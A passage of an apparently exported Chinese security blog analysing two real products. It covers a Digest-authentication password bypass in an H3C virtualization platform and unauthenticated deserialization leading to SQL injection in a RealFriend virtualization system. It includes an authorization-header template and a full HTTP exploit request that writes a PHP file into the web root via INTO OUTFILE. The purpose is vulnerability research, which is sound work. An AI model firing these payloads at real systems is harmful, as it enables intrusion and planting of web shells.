security=&quot;none&quot;/&gt;&lt;http pattern=&quot;/js/lib/jquery-1.9.1.min.js&quot; security=&quot;none&quot;/&gt;&lt;http pattern=&quot;/warnManage/add&quot; security=&quot;none&quot;/&gt;xxxxxx省略xxxxxx&lt;http pattern=&quot;/casrs/**&quot; entry-point-ref=&quot;digestEntryPoint&quot;&gt; &lt;intercept-url pattern=&quot;/**&quot; access=&quot;hasRole(&#x27;ROLE_RSCLIENT&#x27;)&quot; requires-channel=&quot;any&quot;/&gt; &lt;custom-filter ref=&quot;digestFilter&quot; position=&quot;BASIC_AUTH_FILTER&quot;/&gt; &lt;csrf disabled=&quot;true&quot;/&gt;&lt;/http&gt;&lt;!-- rest接口使用 --&gt;&lt;beans:bean id=&quot;digestFilter&quot; class=&quot;com.virtual.plat.server.rs.ext.event.PasswordProtectDigestAuthenticationFilter&quot;&gt; &lt;beans:property name=&quot;userDetailsService&quot; ref=&quot;casUserDetailsService&quot; /&gt; &lt;beans:property name=&quot;authenticationEntryPoint&quot; ref=&quot;digestEntryPoint&quot; /&gt; &lt;beans:property name=&quot;userCache&quot; ref=&quot;casAuthUserCache&quot; /&gt;&lt;/beans:bean&gt; “阉割”的鉴权路由接下来我们来我们就具体看看com.virtual.plat.server.rs.ext.event.PasswordProtectDigestAuthenticationFilter做了什么处理 从代码中不难看出，如果Path为/vm/backUpFromCasserver，那么变量var4则会被设置为true 123456789101112131415161718192021222324public void doFilter(ServletRequest var1, ServletResponse var2, FilterChain var3) throws IOException, ServletException &#123; GenericHttpRequest var6 = new GenericHttpRequest((HttpServletRequest)var1); if (this.a(var6, var2)) &#123; boolean var4 = false; String var5 = ((HttpServletRequest)var6).getPathInfo(); if (&quot;/vm/backUpFromCasserver&quot;.equals(var5)) &#123; var4 = true; &#125; super.doFilter(var6, var2, var3, var4); if (SecurityContextHolder.getContext().getAuthentication() == null) &#123; HttpServletRequest var7; String var8; if ((var8 = (var7 = (HttpServletRequest)var6).getHeader(&quot;Authorization&quot;)) != null &amp;&amp; var8.startsWith(&quot;Digest &quot;)) &#123; this.a(var6); &#125; return; &#125; this.b(var6); &#125;&#125; 继续跟进super.doFilter的调用，其父类的调用为com.virtual.plat.server.rs.ext.event.DigestAuthenticationFilterExt#doFilter 在这里，我们重点关注var4这个参数的传递过程，它出现在两个部分： this.a(var6, var7, var5, var4)) (var8 = new LoginParameter()).setIgnorePw(var4); 123456789101112131415161718public void doFilter(ServletRequest var1, ServletResponse var2, FilterChain var3, boolean var4) throws IOException, ServletException &#123; HttpServletRequest var6 = (HttpServletRequest)var1; HttpServletResponse var7 = (HttpServletResponse)var2; String var5; if ((var5 = var6.getHeader(&quot;Authorization&quot;)) == null || !var5.startsWith(&quot;Digest &quot;) || this.a(var6, var7, var5, var4)) &#123; if (var5 == null || !var5.startsWith(&quot;LDAP &quot;) || this.b(var6, var7, var5)) &#123; LoginParameter var8; if ((var8 = LocalParameter.get()) == null) &#123; (var8 = new LoginParameter()).setIgnorePw(var4); LocalParameter.put(var8); &#125; else &#123; var8.setIgnorePw(var4); &#125; var3.doFilter(var6, var7); &#125; &#125;&#125; 由于后者名字没有混淆更直观，因此我们选择优先查看其如何被调用，从英文名来看，似乎字面意思是设置了忽略密码的属性 由于我只有代码没有环境想在环境中动态调试验证明显不太可能，换个方向思考，有设置必然有获取 从类LoginParameter的方法当中我们不难看出在获取并判断时使用了方法isIgnorePw 1234567891011121314public class LoginParameter &#123; private boolean a; public LoginParameter() &#123; &#125; public boolean isIgnorePw() &#123; return this.a; &#125; public void setIgnorePw(boolean var1) &#123; this.a = var1; &#125;&#125; 在不能运行的情况下，我们只能尝试去搜索看看，通过许少写的jar analyzer很快便定位到了其调用位置，从以下函数逻辑来看，显然函数逻辑只是和密码有效期相关 因此，我们只剩下this.a(var6, var7, var5, var4)可以关注 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556private boolean a(HttpServletRequest var1, HttpServletResponse var2, String var3, boolean var4) throws IOException, ServletException &#123; if (AuthorCenterService.isAuthorCenter()) &#123; Map var15; if ((var15 = a(a(var3.substring(7), &#x27;,&#x27;), &quot;=&quot;, &quot;\\&quot;&quot;)) == null) &#123; a.error(&quot;handleAuthAC Error: headerMap is null.&quot;); return false; &#125; else &#123; String var5 = (String)var15.get(&quot;username&quot;); String var6 = (String)var15.get(&quot;realm&quot;); String var7 = (String)var15.get(&quot;nonce&quot;); String var8 = (String)var15.get(&quot;uri&quot;); String var9 = (String)var15.get(&quot;response&quot;); String var10 = (String)var15.get(&quot;qop&quot;); String var11 = (String)var15.get(&quot;nc&quot;); String var16 = (String)var15.get(&quot;cnonce&quot;); DigestInfo var12; (var12 = new DigestInfo()).setEntryPoint(this.getAuthenticationEntryPoint()); var12.setUsername(var5); var12.setRealm(var6); var12.setNonce(var7); var12.setUri(var8); var12.setResponseDigest(var9); var12.setQop(var10); var12.setNc(var11); var12.setCnonce(var16); var12.setRequestMethod(var1.getMethod()); var16 = AuthorCenterService.getInstance().digestAuth(var12); if (var16 != null) &#123; this.a((HttpServletRequest)var1, (HttpServletResponse)var2, (AuthenticationException)(new BadCredentialsException(var16))); return false; &#125; else &#123; if (a.isDebugEnabled()) &#123; a.debug(&quot;Authentication success for user: &#x27;&quot; + var5 + &quot;&#x27; with response: &#x27;&quot; + var9 + &quot;&#x27;&quot;); &#125; UserDetails var13 = this.f.loadUserByUsername(var5); UsernamePasswordAuthenticationToken var14; if (this.h) &#123; var14 = new UsernamePasswordAuthenticationToken(var13, var13.getPassword(), var13.getAuthorities()); &#125; else &#123; var14 = new UsernamePasswordAuthenticationToken(var13, var13.getPassword()); &#125; var14.setDetails(this.c.buildDetails(var1)); SecurityContextHolder.getContext().setAuthentication(var14); if (var1.getSession() != null) &#123; var1.getSession().setAttribute(&quot;loginName&quot;, var5); &#125; return true; &#125; &#125; &#125; else &#123; return this.b(var1, var2, var3, var4); &#125;&#125; 由于没有具体代码，从AuthorCenterService.isAuthorCenter()逻辑可以看出，默认情况下是没有认证中心的，也就是本地认证 123456789101112131415public static boolean isAuthorCenter() &#123; return gInstance == null ? false : gInstance.useAuthorCenter();&#125;public boolean useAuthorCenter() &#123; return &quot;authorCenter&quot;.equals(this.authorizeType);&#125;@Servicepublic class AuthorCenterService &#123; private static Log log = LogFactory.getLog(AuthorCenterService.class); @Resource private OperatorMgr operatorMgr = null; String authorizeType = &quot;local&quot;; 因此自然而然函数的调用流向了com.virtual.plat.server.rs.ext.event.DigestAuthenticationFilterExt#b(HttpServletRequest, HttpServletResponse, java.lang.String, boolean)，在这个认证中我们主要看if (!var14.equals(var10) &amp;&amp; !var4) &#123;，它的作用就是比对response摘要信息是否一致，而由于var4为true，因此密码是否正确都不会影响程序的执行 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121private boolean b(HttpServletRequest var1, HttpServletResponse var2, String var3, boolean var4) throws IOException, ServletException &#123;Map var5;String var6 = (String)(var5 = a(a(var3 = var3.substring(7), &#x27;,&#x27;), &quot;=&quot;, &quot;\\&quot;&quot;)).get(&quot;username&quot;);String var7 = (String)var5.get(&quot;realm&quot;);String var8 = (String)var5.get(&quot;nonce&quot;);String var9 = (String)var5.get(&quot;uri&quot;);String var10 = (String)var5.get(&quot;response&quot;);String var11 = (String)var5.get(&quot;qop&quot;);String var12 = (String)var5.get(&quot;nc&quot;);String var25 = (String)var5.get(&quot;cnonce&quot;);if (var6 != null &amp;&amp; var7 != null &amp;&amp; var8 != null &amp;&amp; var9 != null &amp;&amp; var2 != null) &#123; if (!&quot;auth&quot;.equals(var11) || var12 != null &amp;&amp; var25 != null) &#123; if (!var7.equals(this.getAuthenticationEntryPoint().getRealmName())) &#123; this.a((HttpServletRequest)var1, (HttpServletResponse)var2, (AuthenticationException)(new BadCredentialsException(this.messages.getMessage(&quot;DigestAuthenticationFilter.incorrectRealm&quot;, new Object[]&#123;var7, this.getAuthenticationEntryPoint().getRealmName()&#125;, &quot;Response realm name &#x27;&#123;0&#125;&#x27; does not match system realm name of &#x27;&#123;1&#125;&#x27;&quot;)))); return false; &#125; else if (!Base64.isBase64(var8.getBytes())) &#123; this.a((HttpServletRequest)var1, (HttpServletResponse)var2, (AuthenticationException)(new BadCredentialsException(this.messages.getMessage(&quot;DigestAuthenticationFilter.nonceEncoding&quot;, new Object[]&#123;var8&#125;, &quot;Nonce is not encoded in Base64; received nonce &#123;0&#125;&quot;)))); return false; &#125; else &#123; String[] var13; if ((var13 = StringUtils.delimitedListToStringArray(var3 = new String(Base64.decode(var8.getBytes())), &quot;:&quot;)).length != 2) &#123; this.a((HttpServletRequest)var1, (HttpServletResponse)var2, (AuthenticationException)(new BadCredentialsException(this.messages.getMessage(&quot;DigestAuthenticationFilter.nonceNotTwoTokens&quot;, new Object[]&#123;var3&#125;, &quot;Nonce should have yielded two tokens but was &#123;0&#125;&quot;)))); return false; &#125; else &#123; long var18; try &#123; var18 = new Long(var13[0]); &#125; catch (NumberFormatException var22) &#123; this.a((HttpServletRequest)var1, (HttpServletResponse)var2, (AuthenticationException)(new BadCredentialsException(this.messages.getMessage(&quot;DigestAuthenticationFilter.nonceNotNumeric&quot;, new Object[]&#123;var3&#125;, &quot;Nonce token should have yielded a numeric first token, but was &#123;0&#125;&quot;)))); return false; &#125; if (!a(var18 + &quot;:&quot; + this.getAuthenticationEntryPoint().getKey()).equals(var13[1])) &#123; this.a((HttpServletRequest)var1, (HttpServletResponse)var2, (AuthenticationException)(new BadCredentialsException(this.messages.getMessage(&quot;DigestAuthenticationFilter.nonceCompromised&quot;, new Object[]&#123;var3&#125;, &quot;Nonce token compromised &#123;0&#125;&quot;)))); return false; &#125; else &#123; boolean var24 = false; UserDetails var26; if ((var26 = this.e.getUserFromCache(var6)) == null) &#123; var24 = true; try &#123; var26 = this.f.loadUserByUsername(var6); &#125; catch (UsernameNotFoundException var21) &#123; this.a((HttpServletRequest)var1, (HttpServletResponse)var2, (AuthenticationException)(new BadCredentialsException(this.messages.getMessage(&quot;DigestAuthenticationFilter.usernameNotFound&quot;, new Object[]&#123;var6&#125;, &quot;Username &#123;0&#125; not found&quot;)))); return false; &#125; if (var26 == null) &#123; throw new AuthenticationServiceException(&quot;AuthenticationDao returned null, which is an interface contract violation&quot;); &#125; this.e.putUserInCache(var26); &#125; String var14; if (!(var14 = a(this.g, var6, var7, var26.getPassword(), var1.getMethod(), var9, var11, var8, var12, var25)).equals(var10) &amp;&amp; !var24 &amp;&amp; !var4) &#123; if (a.isDebugEnabled()) &#123; a.debug(&quot;Digest comparison failure; trying to refresh user from DAO in case password had changed&quot;); &#125; try &#123; var26 = this.f.loadUserByUsername(var6); &#125; catch (UsernameNotFoundException var20) &#123; this.a((HttpServletRequest)var1, (HttpServletResponse)var2, (AuthenticationException)(new BadCredentialsException(this.messages.getMessage(&quot;DigestAuthenticationFilter.usernameNotFound&quot;, new Object[]&#123;var6&#125;, &quot;Username &#123;0&#125; not found&quot;)))); &#125; this.e.putUserInCache(var26); var14 = a(this.g, var6, var7, var26.getPassword(), var1.getMethod(), var9, var11, var8, var12, var25); &#125; if (!var14.equals(var10) &amp;&amp; !var4) &#123; if (a.isDebugEnabled()) &#123; a.debug(&quot;Expected response: &#x27;&quot; + var14 + &quot;&#x27; but received: &#x27;&quot; + var10 + &quot;&#x27;; is AuthenticationDao returning clear text passwords?&quot;); &#125; this.a((HttpServletRequest)var1, (HttpServletResponse)var2, (AuthenticationException)(new BadCredentialsException(this.messages.getMessage(&quot;DigestAuthenticationFilter.incorrectResponse&quot;, &quot;Incorrect response&quot;)))); return false; &#125; else if (var18 &lt; System.currentTimeMillis()) &#123; this.a((HttpServletRequest)var1, (HttpServletResponse)var2, (AuthenticationException)(new NonceExpiredException(this.messages.getMessage(&quot;DigestAuthenticationFilter.nonceExpired&quot;, &quot;Nonce has expired/timed out&quot;)))); return false; &#125; else &#123; if (a.isDebugEnabled()) &#123; a.debug(&quot;Authentication success for user: &#x27;&quot; + var6 + &quot;&#x27; with response: &#x27;&quot; + var10 + &quot;&#x27;&quot;); &#125; UsernamePasswordAuthenticationToken var23; if (this.h) &#123; var23 = new UsernamePasswordAuthenticationToken(var26, var26.getPassword(), var26.getAuthorities()); &#125; else &#123; var23 = new UsernamePasswordAuthenticationToken(var26, var26.getPassword()); &#125; var23.setDetails(this.c.buildDetails(var1)); SecurityContextHolder.getContext().setAuthentication(var23); if (var1.getSession() != null) &#123; var1.getSession().setAttribute(&quot;loginName&quot;, var6); &#125; return true; &#125; &#125; &#125; &#125; &#125; else &#123; if (a.isDebugEnabled()) &#123; a.debug(&quot;extracted nc: &#x27;&quot; + var12 + &quot;&#x27;; cnonce: &#x27;&quot; + var25 + &quot;&#x27;&quot;); &#125; this.a((HttpServletRequest)var1, (HttpServletResponse)var2, (AuthenticationException)(new BadCredentialsException(this.messages.getMessage(&quot;DigestAuthenticationFilter.missingAuth&quot;, new Object[]&#123;var3&#125;, &quot;Missing mandatory digest value; received header &#123;0&#125;&quot;)))); return false; &#125;&#125; else &#123; if (a.isDebugEnabled()) &#123; a.debug(&quot;extracted username: &#x27;&quot; + var6 + &quot;&#x27;; realm: &#x27;&quot; + var6 + &quot;&#x27;; nonce: &#x27;&quot; + var6 + &quot;&#x27;; uri: &#x27;&quot; + var6 + &quot;&#x27;; response: &#x27;&quot; + var6 + &quot;&#x27;&quot;); &#125; this.a((HttpServletRequest)var1, (HttpServletResponse)var2, (AuthenticationException)(new BadCredentialsException(this.messages.getMessage(&quot;DigestAuthenticationFilter.missingMandatory&quot;, new Object[]&#123;var3&#125;, &quot;Missing mandatory digest value; received header &#123;0&#125;&quot;)))); return false;&#125;&#125; 根据digest认证的认证过程，不难得出利用的流程 121. 访问backUpFromCasserver端点，服务器发送临时的质询码2. 根据质询码计算出响应码并发送给服务端校验 而根据代码即可得出Payload的构造 1Authorization: Digest username=&quot;admin&quot;, realm=&quot;VMC RESTful Web Services&quot;, nonce=&quot;xxxxx&quot;, uri=&quot;/cas/xxxxx&quot;, response=&quot;xxxxxx&quot;, qop=auth, nc=xxxx, cnonce=&quot;xxxxx&quot;, algorithm=xxxx 最终通过backUpFromCasserver端点即可获取Cookie身份信息 文件上传不全给出所有细节了(看文章总需要多自己思考)，上传的路由可以自己去找找，给个提示 而这个函数在返回路径时直接做了路径的拼接 12345678910111213141516public static File getTokenedFile(String var0) throws IOException &#123; if (var0 != null &amp;&amp; !var0.isEmpty()) &#123; File var1; if (!(var1 = new File(&quot;/vms/tmptemplet/&quot; + File.separator + var0)).getParentFile().exists()) &#123; var1.getParentFile().mkdirs(); &#125; if (!var1.exists()) &#123; var1.createNewFile(); &#125; return var1; &#125; else &#123; return null; &#125;&#125; 因此完整的利用也就分析出了，由于没有环境，以上分析仅作参考","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"H3C","slug":"H3C","permalink":"https://y4tacker.github.io/tags/H3C/"}]},{"title":"浅析瑞友天翼应用虚拟化系统前台反序列化(V<=7.0.5.1)","slug":"year/2024/5/浅析瑞友天翼应用虚拟化系统远程代码执行","date":"2024-05-07T03:35:52.000Z","updated":"2024-05-29T15:33:08.000Z","comments":true,"path":"2024/05/07/year/2024/5/浅析瑞友天翼应用虚拟化系统远程代码执行/","link":"","permalink":"https://y4tacker.github.io/2024/05/07/year/2024/5/%E6%B5%85%E6%9E%90%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BC%E5%BA%94%E7%94%A8%E8%99%9A%E6%8B%9F%E5%8C%96%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","excerpt":"","text":"浅析瑞友天翼应用虚拟化系统前台反序列化(V&lt;=7.0.5.1)看到应急公告简单分析学习一波，漏洞不算难，代码也比较简单，有些细节还是蛮有意思，算是温故而知新，顺便也捡起一些很久没碰的PHP知识 鉴权这个系统文件不多，功能点大多是需要登录，我们可以重点关注一下鉴权部分，在为数不多的控制器当中可以看到，在admin/index两个控制器中部分功能点都存在对于登录用户的判断，分别对应函数checklogin与adminchecklogin(Ps：在高版本中只有AdminCtroller控制器文件了，武器化也以这个为准) 在这里可以明显看到sql查询为拼接的形式，userId参数来源于session存储文件的反序列化 IndexController#checklogin 12345678910111213141516171819202122232425private function checklogin()&#123; $mUser = M(&#x27;cuser&#x27;); $sessionpath = session_save_path(); $pathName = $this-&gt;openpath($sessionpath); $path = $_REQUEST[&#x27;sessId&#x27;] ? ($sessionpath . &quot;/sess_&quot; . $_REQUEST[&#x27;sessId&#x27;]) : ($sessionpath . &quot;/&quot; . $pathName[&#x27;name&#x27;][0]); $content = file_get_contents($path); $tmp = explode(&quot;|&quot;, $content); $tmp3 = unserialize($tmp[3]); $userId = $tmp3[&#x27;user_id&#x27;]; $cuser = $mUser-&gt;where(&quot;user_id=&#x27;&#123;$userId&#125;&#x27; AND is_group=0 AND is_admin !=1&quot;)-&gt;find(); if (sizeof($cuser) &gt; 0) &#123; $_SESSION[&#x27;UserInfo&#x27;] = $cuser; $_SESSION[&#x27;sessId&#x27;] = $_REQUEST[&#x27;sessId&#x27;]; $this-&gt;assign(&#x27;sessId&#x27;, $_REQUEST[&#x27;sessId&#x27;]); return true; &#125; if ($_SESSION[&#x27;LonginSucceed&#x27;] == false) &#123; //尚未登录 $this-&gt;login(); //$this-&gt;redirect(&#x27;index&#x27;); return false; &#125; else &#123; return true; &#125;&#125; AdminController#checklogin 12345678910111213141516171819202122232425262728293031323334353637383940private function adminchecklogin()&#123; $mUser = M(&#x27;cuser&#x27;); $sessionpath = session_save_path(); $pathName = $this-&gt;openpath($sessionpath); $path = $sessionpath . &quot;/sess_&quot; . $_REQUEST[&#x27;sessId&#x27;]; $content = file_get_contents($path); $tmp = explode(&quot;OverDo&quot;, $content); if (count($tmp) &gt; 1) &#123; $temporary = explode(&quot;|&quot;, $content); $tmp6 = unserialize($temporary[7]); if (!$tmp6) &#123; $tmp6 = unserialize($temporary[1]); &#125; &#125; else &#123; $tmp = explode(&quot;|&quot;, $content); $tmp6 = unserialize($tmp[6]); &#125; $userId = $tmp6[&#x27;user_id&#x27;]; $_SESSION[&#x27;AdminUserInfo&#x27;][&#x27;user_id&#x27;] = $_SESSION[&#x27;AdminUserInfo&#x27;][&#x27;user_id&#x27;] ? $_SESSION[&#x27;AdminUserInfo&#x27;][&#x27;user_id&#x27;] : $userId; $cuser = $mUser-&gt;where(&quot;user_id=&#x27;&#123;$_SESSION[&#x27;AdminUserInfo&#x27;][&#x27;user_id&#x27;]&#125;&#x27; AND is_group=0 AND is_admin=1&quot;)-&gt;find(); if (sizeof($cuser) &gt; 1 &amp;&amp; $cuser[&#x27;is_admin&#x27;] == 1) &#123; $_SESSION[&#x27;AdminLonginSucceed&#x27;] = true; $_SESSION[&#x27;Is_Admin&#x27;] = $cuser[&#x27;is_admin&#x27;]; $_SESSION[&#x27;AdminUserInfo&#x27;] = $InfoLogin[&#x27;AdminUserInfo&#x27;] = $cuser; $_SESSION[&#x27;AdminUserInfo&#x27;][&#x27;name&#x27;] = $cuser[&#x27;name&#x27;]; $this-&gt;assign(&#x27;sessId&#x27;, $_REQUEST[&#x27;sessId&#x27;]); $this-&gt;assign(&#x27;Admin&#x27;, $_SESSION[&#x27;AdminUserInfo&#x27;][&#x27;name&#x27;]); &#125; if ($_SESSION[&#x27;AdminLonginSucceed&#x27;] &amp;&amp; $_SESSION[&#x27;Is_Admin&#x27;] &amp;&amp; $cuser != NULL) &#123; return true; &#125; else &#123; //尚未登录 $this-&gt;login(); //$this-&gt;redirect(&#x27;index&#x27;); $_SESSION[&#x27;AdminLonginSucceed&#x27;] = false; $_SESSION[&#x27;Is_Admin&#x27;] = false; return false; &#125;&#125; 利用方式大致一致，但Admincontroller与IndexController在利用上仍有些许差别，前者利用中多了如下代码，也就是说如果第一次打成功了，userId则会被记录，第二次利用时如果需要更改Payload只需把cookie中PHPSESSID做个修改即可 1$_SESSION[&#x27;AdminUserInfo&#x27;][&#x27;user_id&#x27;] = $_SESSION[&#x27;AdminUserInfo&#x27;][&#x27;user_id&#x27;] ? $_SESSION[&#x27;AdminUserInfo&#x27;][&#x27;user_id&#x27;] : $userId; 失败的session控制利用尝试php中的session存在多种存储方式，通过cookie、文件、数据库等方式均可，存储的格式也有多种 php_serialize 经过serialize()函数序列化数组 php 键名+竖线+经过serialize()函数处理的值 php_binary 键名的长度对应的ascii字符+键名+serialize()函数序列化的值 接下里我们查看系统中关于session的配置，不难发现，存储方式是通过文件，保存在RealFriend\\Rap Server\\Temp\\PhpSession路径下，且存储格式为php 12345678910111213[Session]session.save_handler = files;session.save_path = &quot;C:\\Windows\\Temp&quot;session.save_path =&quot;C:\\Program Files (x86)\\RealFriend\\Rap Server\\Temp\\PhpSession&quot;session.use_cookies = 1session.cookie_secure = 0session.name = PHPSESSIDsession.auto_start = 0session.cookie_lifetime = 0session.cookie_path = /session.cookie_domain =session.cookie_httponly = Truesession.serialize_handler = php 关于session的工作原理就不再赘述网上相关资料也很多了 知道了这些信息，接下来我们便可以思考如何控制这个session文件(通过对session操作赋值)，这个过程非常直接，因此我们第一个很容易想到在登录的过程 在下面的文件中，我们发现赋值部分能控制的有name、pwd、loginPwd、language等 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&lt;?phpinclude &quot;ConDB.XGI&quot;;include &quot;LicenceInfo.XGI&quot;;include &quot;Lg.XGI&quot;;include &quot;Common.XGI&quot;;include &quot;Function.XGI&quot;;include &quot;converter.XGI&quot;;$ErrID = 1;if (!isset($_SESSION)) &#123; session_start();&#125;$COMCASWEB = new main();if (!isset($_REQUEST[&#x27;cmd&#x27;]) &amp;&amp; $_REQUEST[&#x27;cmd&#x27;] == &quot;&quot;) &#123; if (isset($_SESSION[&#x27;UserName&#x27;]) &amp;&amp; !empty($_SESSION[&#x27;UserName&#x27;])) &#123; &#125; if ($GLOBALS[&#x27;_SESSION&#x27;][&#x27;LonginSucceed&#x27;]) &#123; $GLOBALS[&#x27;GLOBALS&#x27;][&#x27;_REQUEST&#x27;][&#x27;DirID&#x27;] = &quot;NULL&quot;; &#125; else &#123; session_unset(); &#125;&#125;$GLOBALS[&#x27;GLOBALS&#x27;][&#x27;_SESSION&#x27;][&#x27;MainXGI&#x27;] = $_SERVER[&#x27;PHP_SELF&#x27;];$GLOBALS[&#x27;GLOBALS&#x27;][&#x27;_SESSION&#x27;][&#x27;Embed&#x27;] = FALSE;$GLOBALS[&#x27;GLOBALS&#x27;][&#x27;_SESSION&#x27;][&#x27;salt&#x27;] = getClientLoginMd5Salt();if (isset($_GET[&#x27;cmd&#x27;]) &amp;&amp; $_GET[&#x27;cmd&#x27;] == &quot;UserLogin&quot;) &#123; $RedURL = $_SERVER[&#x27;PHP_SELF&#x27;]; header(&quot;Location: &quot; . $RedURL); exit;&#125;if (isset($_REQUEST[&#x27;cmd&#x27;]) &amp;&amp; $_REQUEST[&#x27;cmd&#x27;] == &quot;UserLogin&quot;) &#123; $_REQUEST[&#x27;name&#x27;]=trim(filter_inputXssKeyWord($_REQUEST[&#x27;name&#x27;])); $_REQUEST[&#x27;pwd&#x27;]=(filter_inputXssKeyWord($_REQUEST[&#x27;pwd&#x27;])); $_REQUEST[&#x27;loginPwd&#x27;]=trim(filter_inputXssKeyWord($_REQUEST[&#x27;loginPwd&#x27;])); $GLOBALS[&#x27;GLOBALS&#x27;][&#x27;_SESSION&#x27;][&#x27;loginPwd&#x27;]=$_REQUEST[&#x27;loginPwd&#x27;]; $GLOBALS[&#x27;GLOBALS&#x27;][&#x27;_SESSION&#x27;][&#x27;PWD&#x27;] = $_REQUEST[&#x27;pwd&#x27;]; if (inject_check($_REQUEST[&#x27;name&#x27;]) || inject_check($_REQUEST[&#x27;pwd&#x27;])) &#123; $RedURL = $_SERVER[&#x27;PHP_SELF&#x27;]; header(&quot;Location: &quot; . $RedURL); exit; &#125; if (isset($_REQUEST[&#x27;language&#x27;]) &amp;&amp; $_REQUEST[&#x27;language&#x27;] != &quot;&quot;) &#123; $GLOBALS[&#x27;GLOBALS&#x27;][&#x27;_SESSION&#x27;][&#x27;LanguageName&#x27;] = strtoupper($_REQUEST[&#x27;language&#x27;]);&#125; else &#123;&#125;if (!isset($_SESSION[&#x27;LanguageName&#x27;]) &amp;&amp; $_SESSION[&#x27;LanguageName&#x27;] == &quot;&quot;) &#123; $GLOBALS[&#x27;GLOBALS&#x27;][&#x27;_SESSION&#x27;][&#x27;LanguageName&#x27;] = strtoupper($_SERVER[&#x27;HTTP_ACCEPT_LANGUAGE&#x27;]); if (similar_text($_SESSION[&#x27;LanguageName&#x27;], &quot;ZH-CN&quot;) == 5) &#123; $GLOBALS[&#x27;GLOBALS&#x27;][&#x27;_SESSION&#x27;][&#x27;LanguageName&#x27;] = &quot;ZH-CN&quot;; &#125; else &#123; if (similar_text($_SESSION[&#x27;LanguageName&#x27;], &quot;ZH-TW&quot;) == 5) &#123; $GLOBALS[&#x27;GLOBALS&#x27;][&#x27;_SESSION&#x27;][&#x27;LanguageName&#x27;] = &quot;ZH-TW&quot;; &#125; else &#123; $GLOBALS[&#x27;GLOBALS&#x27;][&#x27;_SESSION&#x27;][&#x27;LanguageName&#x27;] = &quot;EN&quot;; &#125; &#125;&#125;if ($_SESSION[&#x27;LanguageName&#x27;] == &quot;&quot;) &#123; $GLOBALS[&#x27;GLOBALS&#x27;][&#x27;_SESSION&#x27;][&#x27;LanguageName&#x27;] = &quot;ZH-CN&quot;;&#125; 但很可惜一眼能看到过滤函数中把&#39;单引号删除了，因此实际利用时不能做到执行的逃逸 12345678function filter_inputXssKeyWord($str)&#123; $str = preg_replace( &quot;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&quot;, &quot;&quot;, preg_replace( &quot;/&lt;(.*)a(.*)l(.*)e(.*)r(.*)t/i&quot;, &quot;&quot;, $str)); $str=str_ireplace(&quot;and&quot;, &quot;&quot;, preg_replace( &quot;/&lt;(.*)a(.*)n(.*)d/i&quot;, &quot;&quot;,$str)); $str=str_ireplace(&quot;&#x27; &#x27;f&#x27;=&#x27;&quot;, &quot;&quot;, str_ireplace(&quot;OR&quot;, &quot;&quot;, $str)); $str=str_ireplace(&quot;+&quot;, &quot;&quot;, str_ireplace(&quot;&#x27;&quot;, &quot;&quot;, $str)); return $str;&#125; 唯一没走过滤的只有language相关参数，但很可惜回顾之前的反序列化部分要求位置太过于靠前，另一个admin控制器的则在第七位，仅有参数Pwd在存储文件按|分割在第五位，能通过写入|实现反序列化payload的控制，但很可惜无法逃逸单引号的利用 12$tmp = explode(&quot;|&quot;, $content);$tmp3 = unserialize($tmp[3]); 柳暗花明又一村第二天写完博客吃饭期间，经过atao的提示我又去看了一下php的配置，不看不知道，一看吓一跳(所以说有时候不要光看配置文件.ini的内容，还是phpinfo里的信息更为直观) 这不就是以前CTF的利用session.upload_progress做条件竞争写文件么？经过测试也是可以直接利用的，这方面知识点遗忘的 可以看看以前的老文章，这里就不当搬运工了，利用session.upload_progress进行文件包含和反序列化渗透 通过PHP_SESSION_UPLOAD_PROGRESS的利用，将反序列化数据放在filename当中即可实现更稳定的利用，目前来看三种利用方式里面这个最佳 PHP临时文件另一个能想到的就是之前打ctf的老姿势临时文件包含了，配合上windows的通配符 忘了的可以看看远古文章https://soroush.me/blog/2014/07/file-upload-and-php-on-iis-wildcards/ 查看系统具体配置，可以看到缓存文件在默认路径下 12345file_uploads = Onupload_tmp_dir = &quot;C:\\Windows\\Temp&quot;upload_max_filesize = 32Mmax_file_uploads = 20allow_url_fopen = On 通过查看配置文件不难发现临时文件在默认的C:\\Windows\\Temp下 123456789101112131415161718POST /hmrao.php?s=/Admin/title&amp;sessId=/../../../../../../Windows/Temp/php&lt;&lt; HTTP/1.1Host: Connection: closeCookie: PHPSESSID=aaabbbcccddefzzzzazzza; CookieLanguageName=EN; UserAuthtype=0Accept-Language: en-US,en;q=0.5User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36Content-Type: multipart/form-data; boundary=------------------------wHKGQZyLwKYaYTdizteSYGbJvzMyKPIUBukyzTKMAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Upgrade-Insecure-Requests: 1Accept-Encoding: gzip, deflate&#123;&#123;char(a-z)&#125;&#125;Content-Length: 188--------------------------wHKGQZyLwKYaYTdizteSYGbJvzMyKPIUBukyzTKMContent-Disposition: form-data; name=&quot;file&quot;;filename=&quot;1.txt&quot;||||||a:1:&#123;s:7:&quot;user_id&quot;;s:310:&quot;y4test&#x27;) union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31, 0x003c3f7068702066696c655f7075745f636f6e74656e7473282779347461636b65722e706870272c273c3f706870206563686f28224861636b65642042792059347461636b657222293b27293b3f3e into outfile &#x27;../../WebRoot/y4tacker.php&#x27;#&quot;;&#125;|||--------------------------wHKGQZyLwKYaYTdizteSYGbJvzMyKPIUBukyzTKM-- 一发入魂打一波 但仍然存在一定问题，假如我们的安装目录不在默认的C盘，那么目录穿越不能跨越盘符做读取，那这时候又该怎么办呢？ ThinkPHP日志包含尽管安装路径不一定在C盘，那么我们还能从什么方向思考呢，有情我们的老演员TP，它的日志总会在项目路径下吧(RealFriend\\Rap Server\\WebRoot\\casweb\\Runtime\\Logs\\Home) 